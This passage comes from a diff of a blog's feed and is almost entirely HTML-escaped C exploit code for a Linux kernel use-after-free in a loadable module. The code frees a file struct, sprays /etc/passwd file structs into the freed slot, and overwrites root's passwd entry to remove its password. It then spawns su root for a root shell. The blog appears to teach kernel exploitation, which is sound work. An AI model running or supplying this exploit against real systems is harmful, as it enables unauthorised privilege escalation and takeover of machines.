+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(res &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] prlimit failed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] RLIMIT_NOFILE set to:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rlim_cur = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rlim_max = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, cur, max);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;argc&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;argv&lt;&#x2F;span&gt;&lt;span&gt;[]) {
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const char &lt;&#x2F;span&gt;&lt;span&gt;*placeholder = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Looks like it does not work properly D:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const char &lt;&#x2F;span&gt;&lt;span&gt;*privesc = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;root::0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; pid = -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; fd0, fd1, device_fd;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; fd_spray[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;];
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span&gt;*ptr;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Fork &amp;amp; wait for success&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	pid = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fork&lt;&#x2F;span&gt;&lt;span&gt;();
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(pid == -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to fork for a new process&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else if&lt;&#x2F;span&gt;&lt;span&gt;(pid == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Waiting for corruption completion.
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	 	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Changing user to root.
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span&gt;*argvx[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] = { &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;bin&#x2F;su&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL &lt;&#x2F;span&gt;&lt;span&gt;};
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execve&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;bin&#x2F;su&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;amp;argvx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;		
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Should never be reached.
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Opening LKM.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Opening LKM&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	device_fd = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(DEVICE_FILE, O_RDONLY);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(device_fd &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to open device file&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Opening tmp file.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Opening tmp file&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	fd0 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(TMP_FILE, O_CREAT | O_RDWR, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0666&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fd0 &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to open &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, TMP_FILE);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Allocating some bytes into tmp file to prevent bus error.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; fallocate or ftruncate are other viable options.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Allocating some bytes into tmp file to prevent bus error&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(fd0, placeholder, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(placeholder));
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Mapping tmp file into memory.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Size 1 allocates minimum size which is an entire page.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Mapping tmp file into memory&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	ptr = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mmap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, PROT_READ | PROT_WRITE, MAP_SHARED, fd0, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(ptr == MAP_FAILED) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to map &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; into memory&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, TMP_FILE);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Limiting the max amount of file descriptors.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Limiting max amount of file descriptors&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;set_fd_limit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;);	
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Forcing file struct release through file-&amp;gt;f_count-&amp;gt;counter decrement. 
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Forcing file struct release. Expecting EBADF:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	fd1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, &amp;amp;fd0);
+&lt;&#x2F;span&gt;&lt;span&gt;	fd1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, &amp;amp;fd0);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Extending max amount of file descriptors.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Extending max amount of file descriptors&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;set_fd_limit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;);	
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Spray to fill the previously freed file struct with a &#x2F;etc&#x2F;passwd file struct. 
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Spraying file structs pointing to &#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; i &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;		fd_spray[i] = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, O_RDONLY);
+&lt;&#x2F;span&gt;&lt;span&gt;       		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fd_spray[i] &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;                	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to spray &#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;        	}
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Checking for successful UAF.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Checking for successful UAF. Content should be from &#x2F;etc&#x2F;passwd:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;fputs&lt;&#x2F;span&gt;&lt;span&gt;(ptr, stdout);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Overwriting &#x2F;etc&#x2F;passwd root entry.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Overwriting &#x2F;etc&#x2F;passwd root entry. Content should have been modified:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;memcpy&lt;&#x2F;span&gt;&lt;span&gt;(ptr, privesc, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(privesc));
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;fputs&lt;&#x2F;span&gt;&lt;span&gt;(ptr, stdout);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Entering eternal loop.	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Corruption process has been completed. Waiting for a root shell...&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+ &lt;!----&gt;
+
+
+&lt;div
+  class=&quot;my-4 flex flex-col rounded-lg bg-[var(--admonition-bg)]&quot;
+  style=&quot;--admonition-bg: rgba(68, 138, 255, 0.1)&quot;
+&gt;
+  &lt;div class=&quot;flex items-center rounded-t-lg bg-[var(--admonition-bg)] p-1&quot;&gt;
+    &lt;div
+      class=&quot;mx-2 h-4 w-4 text-[0] [background:var(--url)_center_center_no-repeat] dark:invert&quot;
+      style=&quot;--url: url(.&#x2F;icons&#x2F;note.svg)&quot;
+    &gt;
+      note
+    &lt;&#x2F;div&gt;
+    &lt;span&gt;&lt;strong&gt;note&lt;&#x2F;strong&gt;&lt;&#x2F;span&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div class=&quot;pl-4&quot;&gt;&lt;p&gt;If you find a misconception or an error in any of my posts, please &lt;a href=&quot;mailto:gum3t@proton.me&quot;&gt;contact me&lt;&#x2F;a&gt; and I&#x27;ll fix it asap.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+</content>
+        
+    </entry>
+</feed>
